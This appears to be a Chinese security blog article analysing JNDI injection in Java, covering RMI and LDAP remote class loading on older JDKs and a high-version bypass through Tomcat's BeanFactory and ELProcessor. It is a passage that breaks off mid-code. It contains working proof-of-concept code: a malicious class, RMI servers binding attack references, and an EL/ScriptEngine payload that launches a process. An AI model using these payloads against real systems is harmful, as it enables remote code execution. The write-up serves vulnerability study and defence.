---
title: JNDI注入攻防全解析：从低版本RCE到高版本绕过分析
url: https://mp.weixin.qq.com/s/j0ZOcjFFK_6sThi4VdX6gA
source: Doonsec's feed
date: 2026-03-16
fetch_date: 2026-03-17T04:12:00.928157
---

# JNDI注入攻防全解析：从低版本RCE到高版本绕过分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/RDiaL6j1Wgd6sGvBowRyVHabGmEFEJZEZ9ydC2VNP7BvAVyFlS8Rt7dogc5TTcLeKzSgQV0L0R6fiajhnMyialMYO89qE3fYhZG4WRmjgD6zK4/0?wx_fmt=jpeg)

# JNDI注入攻防全解析：从低版本RCE到高版本绕过分析

原创

尘佑不尘
尘佑不尘

泷羽Sec-尘宇安全

![]()

在小说阅读器中沉浸阅读

# 低版本注入

先来复习一下jndi注入

## rmi

先准备一个恶意类编译成class

```
//package JNDI;

import java.lang.Runtime;

public class test{
    static {
        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            System.out.println(e);
        }
    }
    public  test(){}
}
```

本地起一个python服务

服务端代码：绑定恶意class文件

```
import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws Exception{
        Registry registry= LocateRegistry.createRegistry(7777);

        Reference reference = new Reference("test", "test", "http://localhost/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("calc", wrapper);

    }
}
```

客户端代码：

```
package JNDI;

import com.mchange.v2.naming.JavaBeanObjectFactory;

import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        new InitialContext().lookup("rmi://127.0.0.1:7777/calc");
    }
}
```

先运行服务端代码，再允许客户端

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7YFEuwHnDgHnU2SeVxBOJ5pB5Pw5rogmq9713m4tytKb5QAvFxxLphhfPoaCb1tGE0ic6p5eribQ6QlIF9M5X6jjs0UuBia6J4lc/640?wx_fmt=png&from=appmsg)

接下来分析漏洞

从RegistryContext.lookup方法开始跟

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4aHGAHj0sKpA5HhAPsIcjASic6FpWNYWFIy3OwEMEQB9CVEic67NbsVW4qrkaw4jRic4rPkZ7icWOFRdDu6nNKm1OTFVD0E1yoyHE/640?wx_fmt=png&from=appmsg)

继续跟decodeObject

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7Ena7ajn7nggfMXx9bBENBPXB5eaJB0HiaPmMUbnVianzCODZLrWBrBPicxe9KYBmV2KmVSleVviaSqtfHysQd0ibL9hxoT7k2r36Q/640?wx_fmt=png&from=appmsg)

继续跟getObjectInstance方法

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5S635RzyxoDBh8xC3ImsE7bxFCV7XODxvxDa0hqibLg4tg6tfEDkxDXwwjrUicog3XRrib5Wl6Zwovicib7oWuR27wqs0TSUQXOkF8/640?wx_fmt=png&from=appmsg)

跟进这个方法

此处`clas = helper.loadClass(factoryName);`尝试从本地加载`Factory`类，如果不存在本地不存在此类，则会从`codebase`中加载：`clas = helper.loadClass(factoryName, codebase);`会从远程加载我们恶意class，然后在`return`那里`return (clas != null) ? (ObjectFactory) clas.newInstance() : null;`对我们的恶意类进行一个实例化，进而加载我们的恶意代码。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4D8YgLn3fGLg1edVjNZicZYdpxA9J9DzlzHOztbk0VgvsxP1kD8oJZ0ySJBEcI6d3SDLIPAvY5tsB4icFIv9icdVftcH0Pjn5XIY/640?wx_fmt=png&from=appmsg)

由于test类不是我们本地类就会远程加载

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd57CjTiahyNmZbSVUDDN9kqh3c84t2ZG6OSohbamR1B7Wmr6c39rzia4drjJRg6OZN4JfibMUaab4SBehzM2YhdmS5Kic8A1iaYM944/640?wx_fmt=png&from=appmsg)

跟进loadclass

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5gywQ5Hd0bSic8fiau4ckCIibHq5dvSicmkWsDa7xe6nf3zl43IssNfVTVfgfic8xXPDpJd4tt8Jq6kpcJsmFfcNlGibPzlgzjXHegM/640?wx_fmt=png&from=appmsg)

直接Class.forName并传入了true，所以这里会做初始化，如果我们在恶意类里面的相关命令执行的代码写到的是初始化模块里面，则在这里就会触发了，如果是在构造方法里面写的相关命令执行的代码则是在newInstance里面触发。

调用栈

```
loadClass:73, VersionHelper12 (com.sun.naming.internal)
loadClass:61, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:464, RegistryContext (com.sun.jndi.rmi.registry)
lookup:124, RegistryContext (com.sun.jndi.rmi.registry)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:417, InitialContext (javax.naming)
main:9, JNDI_Test (JNDI)
```

## ldap

直接yakit起一个服务端

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd7HvMQ8xtV451WNya9ibWDicpconEiaZHNfzcyQALmbgLPDso5UBdQ2qZhADX3Ylw5YZRPJicKP7L3KnibWkFfR28wHf5E4o4Mq1bFc/640?wx_fmt=png&from=appmsg)

客户端代码：

```
package JNDI;

import com.mchange.v2.naming.JavaBeanObjectFactory;

import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        new InitialContext().lookup("ldap://127.0.0.1:8085/ecEzwVXo");
    }
}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd5zPwCnfdURbGIaAIz9k2wU0Sg3ib26RBic6WvL21Sxucic7neQFY84rnCf6fxnZr2GmwZbcQCLAoRMyDhcB8MkCiaQWZsjswnSv3E/640?wx_fmt=png&from=appmsg)

接下来进行漏洞分析

```
调用了一个DirectoryManager.getObjectInstance 类似于NamingManager.getobjectInstance
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd7L6BwpvlANq6GiboCusiaRKY0ao3OsljPESgHXeclMicEpSrMnwd0dXUqHIZiabjfeHxJg6s8vBnf1SqubichyO6WlJHibEkSJ5wgQY/640?wx_fmt=png&from=appmsg)

由于不是本地类就要远程加载

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd4QYqibPjLof5Fk2d5IjSEwkU7JqBgazNdiaeB84VDhJ3cNsAXscZP4c83wibu9PC2Px4eNatg5d8fX1ib3zqUVuSWptvlFcy6dqco/640?wx_fmt=png&from=appmsg)

```
loadClass:72, VersionHelper12 (com.sun.naming.internal)
loadClass:61, VersionHelper12 (com.sun.naming.internal)
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
getObjectInstance:189, DirectoryManager (javax.naming.spi)
c_lookup:1085, LdapCtx (com.sun.jndi.ldap)
p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:417, InitialContext (javax.naming)
main:9, JNDI_Test (JNDI)
```

# 高版本的限制

decodeObject加了一个if判断

![](https://mmbiz.qpic.cn/mmbiz_png/RDiaL6j1Wgd54VRAAZEYHSfcicFv185jbfvia8GObEkPbKXia5maaAmaiciaqOUKycJ3Y0QWa2dTdINKibbql7c39BicQXc7GMibJlwtWk0u0icm7UDM8/640?wx_fmt=png&from=appmsg)

**绕过方法**

我们的目的就是能够成功的 调用`NamingManager.getObjectInstance`

因为这里会调用本地工厂的getObjectInstance方法，如果本地getObjectInstance方法里面存在恶意方法，就可以实现rce

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RDiaL6j1Wgd5R92SvLNNLticgqnQlGT6nzsqX8Qich34AtKzNu4siaCH5HfxmP8537WGGu06aAPpheJZ7ZJzMZ1e4eEa6FsoQxGUkKfOibibs8CXQ/640?wx_fmt=png&from=appmsg)

不抛出异常的话就是
1、令 ref 为空
2、令 ref.GetFactoryClassLocation() 为空
3、令 trustURLCodebase 为 true

主要使用第二种方法
Ref.GetFactoryClassLocation() 返回空，让 ref 对象的 classFactoryLocation 属性为空，这个属性表示引用所指向对象的对应 factory 名称，对于远程代码加载而言是 codebase，即远程代码的 URL 地址(可以是多个地址，以空格分隔)，这正是我们针对低版本的利用方法；如果对应的 factory 是本地代码，则该值为空，这是绕过高版本 JDK 限制的关键

## BeanFactory

利用本地的类进行利用，对于本地的类也是有要求的，这个类必须是个工厂类，该工厂类型必须实现javax.naming.spi.ObjectFactory 接口，因为在javax.naming.spi.NamingManager#getObjectFactoryFromReference最后的return语句对工厂类的实例对象进行了类型转换return (clas != null) ? (ObjectFactory) clas.newInstance() : null;；并且该工厂类至少存在一个 getObjectInstance() 方法

`org.apache.naming.factory.BeanFactory`，并且该类存在于Tomcat依赖包

添加依赖

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>8.5.0</version>
</dependency>

<dependency>
    <groupId>org.apache.el</groupId>
    <artifactId>com.springsource.org.apache.el</artifactId>
    <version>7.0.26</version>
</dependency>
```

服务端代码

```
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

    public static void main(String[] args) throws Exception{

        Registry registry = LocateRegistry.createRegistry(7777);

        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));

        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("calc", referenceWrapper);

    }
}
```

客户端代码

```
package JNDI;

import com.mchange.v2.naming.JavaBeanObjectFactory;

import javax.naming.InitialContext;

public class JNDI_Test {
    pu...